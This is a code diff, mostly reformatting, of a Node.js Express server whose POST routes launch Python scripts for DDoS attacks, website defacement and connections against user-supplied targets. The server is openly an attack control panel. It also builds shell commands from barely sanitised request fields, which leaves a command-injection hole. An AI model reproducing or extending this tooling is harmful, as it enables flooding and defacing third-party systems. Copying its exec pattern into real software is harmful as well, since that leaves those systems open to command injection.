@@ -3,19 +3,18 @@ const { exec } = require('child_process');
 const app = express();
 const port = 3000;
 const path = require('path');
-const fs = require('fs'); // Import the fs module
+const fs = require('fs');
 
 // Middleware to prevent execution if a 'SAFE_MODE' flag is present
 app.use((req, res, next) => {
-  if (process.env.SAFE_MODE === 'true') {
-    return res.status(403).send('Server is in safe mode.  Offensive actions are disabled.');
-  }
-  next();
+    if (process.env.SAFE_MODE === 'true') {
+        return res.status(403).send('Server is in safe mode. Offensive actions are disabled.');
+    }
+    next();
 });
 
 app.use(express.static(path.join(__dirname, '../')));
 app.use(express.json());
-
 
 // Centralized error handling function
 function handleCommandExecution(command, res, operation) {
@@ -29,83 +28,79 @@ function handleCommandExecution(command, res, operation) {
     });
 }
 
-// Check if ddos.py exists before defining the route
-const ddosScriptPath = path.join(__dirname, 'ddos/ddos.py');
+// Construct paths relative to the current file
+const ddosScriptPath = path.join(__dirname, 'ddos', 'ddos.py');
+const defacementScriptPath = path.join(__dirname, 'defacement', 'defacement.py');
+const connectionScriptPath = path.join(__dirname, 'connection', 'connection.py');
+
+// DDoS route
 if (fs.existsSync(ddosScriptPath)) {
-  app.post('/ddos', (req, res) => {
-      const target = req.body.target;
-      const time = req.body.time;
-      const method = req.body.method;
+    app.post('/ddos', (req, res) => {
+        const target = req.body.target;
+        const time = req.body.time;
+        const method = req.body.method;
 
-      if (!target || !time || !method) {
-          return res.status(400).send('Target, time, and method are required');
-      }
+        if (!target || !time || !method) {
+            return res.status(400).send('Target, time, and method are required');
+        }
 
-      // Sanitize input (basic example)
-      const sanitizedTarget = String(target).trim();
-      const sanitizedTime = parseInt(time, 10);
-      const sanitizedMethod = String(method).trim();
+        const sanitizedTarget = String(target).trim();
+        const sanitizedTime = parseInt(time, 10);
+        const sanitizedMethod = String(method).trim();
 
-      if (isNaN(sanitizedTime) || sanitizedTime <= 0) {
-          return res.status(400).send('Invalid time value.');
-      }
+        if (isNaN(sanitizedTime) || sanitizedTime <= 0) {
+            return res.status(400).send('Invalid time value.');
+        }
 
-
-      const command = `python3 ${ddosScriptPath} --target ${sanitizedTarget} --time ${sanitizedTime} --method ${sanitizedMethod}`;
-
-      handleCommandExecution(command, res, 'DDoS attack');
-  });
+        const command = `python3 ${ddosScriptPath} --target ${sanitizedTarget} --time ${sanitizedTime} --method ${sanitizedMethod}`;
+        handleCommandExecution(command, res, 'DDoS attack');
+    });
 } else {
-  console.warn("ddos.py not found.  DDoS route disabled.");
+    console.warn("ddos.py not found. DDoS route disabled.");
 }
 
-// Check if defacement.py exists before defining the route
-const defacementScriptPath = path.join(__dirname, 'defacement/defacement.py');
+// Defacement route
 if (fs.existsSync(defacementScriptPath)) {
-  app.post('/defacement', (req, res) => {
-      const target = req.body.target;
-      const imageUrl = req.body.imageUrl;
+    app.post('/defacement', (req, res) => {
+        const target = req.body.target;
+        const imageUrl = req.body.imageUrl;
 
-      if (!target || !imageUrl) {
-          return res.status(400).send('Target and image URL are required');
-      }
+        if (!target || !imageUrl) {
+            return res.status(400).send('Target and image URL are required');
+        }
 
-      // Sanitize input (basic example)
-      const sanitizedTarget = String(target).trim();
-      const sanitizedImageUrl = String(imageUrl).trim();
+        const sanitizedTarget = String(target).trim();
+        const sanitizedImageUrl = String(imageUrl).trim();
 
-      const command = `python3 ${defacementScriptPath} --target ${sanitizedTarget} --image_url ${sanitizedImageUrl}`;
-      handleCommandExecution(command, res, 'Defacement');
-  });
+        const command = `python3 ${defacementScriptPath} --target ${sanitizedTarget} --image_url ${sanitizedImageUrl}`;
+        handleCommandExecution(command, res, 'Defacement');
+    });
 } else {
-  console.warn("defacement.py not found.  Defacement route disabled.");
+    console.warn("defacement.py not found. Defacement route disabled.");
 }
 
-// Check if connection.py exists before defining the route
-const connectionScriptPath = path.join(__dirname, 'connection/connection.py');
+// Connection route
 if (fs.existsSync(connectionScriptPath)) {
-  app.post('/connection', (req, res) => {
-      const target = req.body.target;
-      const port = req.body.port;
+    app.post('/connection', (req, res) => {
+        const target = req.body.target;
+        const port = req.body.port;
 
-      if (!target || !port) {
-          return res.status(400).send('Target and port are required');
-      }
+        if (!target || !port) {
+            return res.status(400).send('Target and port are required');
+        }
 
-      // Sanitize input (basic example)
-      const sanitizedTarget = String(target).trim();
-      const sanitizedPort = parseInt(port, 10);
+        const sanitizedTarget = String(target).trim();
+        const sanitizedPort = parseInt(port, 10);
 
-      if (isNaN(sanitizedPort)) {
-          return res.status(400).send('Invalid port value.');
-      }
+        if (isNaN(sanitizedPort)) {
+            return res.status(400).send('Invalid port value.');
+        }
 
-      const command = `python3 ${connectionScriptPath} --target ${sanitizedTarget} --port ${sanitizedPort}`;
-
-      handleCommandExecution(command, res, 'Connection');
-  });
+        const command = `python3 ${connectionScriptPath} --target ${sanitizedTarget} --port ${sanitizedPort}`;
+        handleCommandExecution(command, res, 'Connection');
+    });
 } else {
-  console.warn("connection.py not found. Connection route disabled.");
+    console.warn("connection.py not found. Connection route disabled.");
 }
 
 app.listen(port, () => {
